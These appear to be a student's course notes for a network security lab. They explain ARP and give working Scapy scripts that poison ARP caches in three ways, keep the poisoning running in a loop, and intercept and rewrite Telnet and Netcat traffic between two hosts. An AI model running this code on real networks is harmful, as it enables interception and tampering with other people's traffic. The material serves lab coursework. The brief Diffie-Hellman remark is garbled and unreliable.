## Message Integrity, PKI, and TLS

### Diffie-Hellman

Always used with RSA because DH needs to be protected. It can't be used as plain text.

![[Screenshot 2025-05-16 at 10.21.37 AM.png]]

## Firewalls

## Layer 2 Security

## Wireless Security

## Lab 3

**I. Core ARP Concepts**

*   **ARP (Address Resolution Protocol):** Maps IP addresses to MAC addresses on a local network.
*   **ARP Request:** Broadcast. "Who has IP `target_IP`? Tell `sender_IP`."
    *   Ethernet Dst: `ff:ff:ff:ff:ff:ff`
    *   ARP Opcode: `1` (request)
    *   ARP `psrc`: `sender_IP`, `hwsrc`: `sender_MAC`
    *   ARP `pdst`: `target_IP`, `hwdst`: `00:00:00:00:00:00` (or `ff:ff:ff:ff:ff:ff` for Gratuitous)
*   **ARP Reply:** Unicast (usually). "`target_IP` is at `target_MAC`."
    *   Ethernet Dst: `requester_MAC`
    *   ARP Opcode: `2` (reply)
    *   ARP `psrc`: `target_IP`, `hwsrc`: `target_MAC` (this is what the victim caches)
    *   ARP `pdst`: `sender_IP`, `hwdst`: `sender_MAC`
*   **ARP Cache:** Temporary storage on hosts for IP-MAC mappings.
    *   Check: `arp -n` (Linux)
    *   Delete entry: `arp -d <IP_ADDRESS>`
*   **Gratuitous ARP:** A host sends an ARP packet (often a request, sometimes a reply) about its *own* IP address, not in response to a request.
    *   **Purpose:** Update ARP caches of other hosts (e.g., after IP change), detect IP conflicts.
    *   **For Poisoning (Task 1.C - Gratuitous ARP Request):**
        *   ARP `psrc` (Sender IP) = ARP `pdst` (Target IP) = IP being claimed.
        *   ARP `hwsrc` (Sender MAC) = Attacker's MAC.
        *   Ethernet Dst = `ff:ff:ff:ff:ff:ff` (Broadcast).
        *   ARP `hwdst` = `ff:ff:ff:ff:ff:ff` (Broadcast in lab spec).

**II. ARP Poisoning Techniques (Scapy Examples)**

*   **Victim:** Host A (`IP_A`, `MAC_A`)
*   **Target of Impersonation:** Host B (`IP_B`, `MAC_B`)
*   **Attacker:** Host M (`IP_M`, `MAC_M`)

1.  **Task 1.A: ARP Request Attack** (Poison A's cache: `IP_B` is at `MAC_M`)
    ```python
    # On Host M, send to Host A
    # Tell A that IP_B (psrc) is at MAC_M (hwsrc), by asking A (pdst) about itself
    arp_pkt = Ether(src=MAC_M, dst=MAC_A) / \
              ARP(op=1, # Request
                  hwsrc=MAC_M, psrc=IP_B,  # Spoofed Sender (M claims to be B)
                  hwdst="00:00:00:00:00:00", pdst=IP_A) # Actual Target of ARP query
    sendp(arp_pkt, iface="eth0", verbose=False)
    ```
    *Key Idea:* A receives an ARP request seemingly from `IP_B` (but with `MAC_M`). Some OSes might cache `IP_B -> MAC_M` from the `psrc`/`hwsrc` of the request.

2.  **Task 1.B: ARP Reply Attack** (Poison A's cache: `IP_B` is at `MAC_M`)
    ```python
    # On Host M, send to Host A
    # Tell A (pdst, hwdst) that IP_B (psrc) is at MAC_M (hwsrc)
    arp_pkt = Ether(src=MAC_M, dst=MAC_A) / \
              ARP(op=2, # Reply
                  hwsrc=MAC_M, psrc=IP_B,    # The poisoned mapping
                  hwdst=MAC_A, pdst=IP_A)    # Destination of this reply
    sendp(arp_pkt, iface="eth0", verbose=False)
    ```
    *Key Idea:* Send an unsolicited ARP reply to A.

3.  **Task 1.C: Gratuitous ARP Request Attack** (Poison A's cache: `IP_B` is at `MAC_M`)
    ```python
    # On Host M, send as broadcast
    # Announce that IP_B (psrc, pdst) is at MAC_M (hwsrc)
    BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
    arp_pkt = Ether(src=MAC_M, dst=BROADCAST_MAC) / \
              ARP(op=1, # Request
                  hwsrc=MAC_M, psrc=IP_B,        # Announce IP_B is at MAC_M
                  hwdst=BROADCAST_MAC, pdst=IP_B) # Target IP is also IP_B
    sendp(arp_pkt, iface="eth0", verbose=False)
    ```
    *Key Idea:* Broadcast an ARP request where sender IP and target IP are the IP address being advertised (`IP_B`), with attacker's MAC (`MAC_M`).


**III. Man-in-the-Middle (MITM) Attack**

1.  **Setup:**
    *   **Poison A:** Convince A that `IP_B` is at `MAC_M`.
    *   **Poison B:** Convince B that `IP_A` is at `MAC_M`.
        *   Use ARP Reply attacks (like Task 1.B, but targeted appropriately for each victim).
        *   Run `poison_a.py` and `poison_b.py` continuously in background:
            `while true; do sudo python3 poison_script.py; sleep 2; done`
    *   **IP Forwarding on Attacker (M):**
        *   `sudo sysctl net.ipv4.ip_forward=1` (Enable: to establish initial connection)
        *   `sudo sysctl net.ipv4.ip_forward=0` (Disable: to let Scapy script intercept & modify)

![[Screenshot 2025-05-16 at 9.51.24 AM.png]]

2.  **Scapy Sniff-and-Spoof (Skeleton for `mitm_telnet.py` / `mitm_netcat.py`):**
    ```python
    from scapy.all import *

    # IP_A, MAC_A, IP_B, MAC_B, MAC_M defined
    # For Netcat: student_id_bytes, replacement_bytes defined

    def spoof_pkt(pkt):
        if IP in pkt and TCP in pkt:
            # Packet from A to B (Client -> Server)
            if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
                newpkt_ip = IP(bytes(pkt[IP])) # Copy L3+
                del(newpkt_ip.chksum)
                del(newpkt_ip[TCP].chksum)
                
                if pkt[TCP].payload:
                    data = pkt[TCP].payload.load
                    # --- MODIFICATION LOGIC ---
                    # Telnet: newdata = data.replace(b'Q', b'Z')
                    # Netcat: newdata = data.replace(student_id_bytes, replacement_bytes)
                    # --------------------------
                    if TCP in newpkt_ip and Raw in newpkt_ip[TCP]: # Clear old payload
                        del(newpkt_ip[TCP].payload)
                    sendp(Ether(src=MAC_M, dst=MAC_B)/newpkt_ip/newdata, iface="eth0", verbose=False)
                else: # No payload
                    sendp(Ether(src=MAC_M, dst=MAC_B)/newpkt_ip, iface="eth0", verbose=False)
            
            # Packet from B to A (Server -> Client - usually just forward)
            elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
                newpkt_ip = IP(bytes(pkt[IP]))
                del(newpkt_ip.chksum)
                del(newpkt_ip[TCP].chksum)
                # No payload modification for B->A in this lab
                sendp(Ether(src=MAC_M, dst=MAC_A)/newpkt_ip, iface="eth0", verbose=False)

    # Filter for Telnet: f = f"tcp and port 23 and ((src host {IP_A} and dst host {IP_B}) or (src host {IP_B} and dst host {IP_A}))"
    # Filter for Netcat: f = f"tcp and port 9090 and ..." (similar structure)
    sniff(iface="eth0", filter=f, prn=spoof_pkt, store=0)
    ```

**IV. Key Tools & Commands**

*   **Scapy:** Python library for packet manipulation.
    *   `Ether()`, `ARP()`, `IP()`, `TCP()`, `Raw()` (for payload)
    *   `/` operator to stack layers.
    *   `sendp()`: Send packet at Layer 2 (needs full Ethernet frame).
    *   `sniff()`: Capture packets.
*   **Wireshark:** Packet analyzer.
    *   Capture on `br-xxxx` (host bridge interface).
    *   Display filters (e.g., `arp`, `tcp.port == 23`, `ip.addr == x.x.x.x`).
*   `telnet <IP>`
*   `nc <IP> <PORT>` (client)
*   `nc -lp <PORT>` (server)

## Lab 4

## TLS HW3